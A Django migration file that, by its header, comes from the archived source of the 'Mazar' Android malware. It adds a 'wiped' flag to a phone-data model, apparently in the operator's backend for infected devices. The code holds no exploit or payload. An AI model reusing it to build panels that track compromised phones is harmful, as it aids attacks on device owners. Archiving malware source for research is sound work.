# ------------------------------------------------------------
# name      Mazar
# type      android
# cve       —
# year      unknown
# os        Android
# authors   unknown
# source    RamadhanAmizudin/malware
# archived  RamadhanAmizudin, krisyotam (2026)
# notes     —
# ------------------------------------------------------------
# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.db import models, migrations


class Migration(migrations.Migration):
    dependencies = [
        ('smsapp', '0002_auto_20150414_1927'),
    ]

    operations = [
        migrations.AddField(
            model_name='phonedata',
            name='wiped',
            field=models.BooleanField(default=False),
        ),
    ]
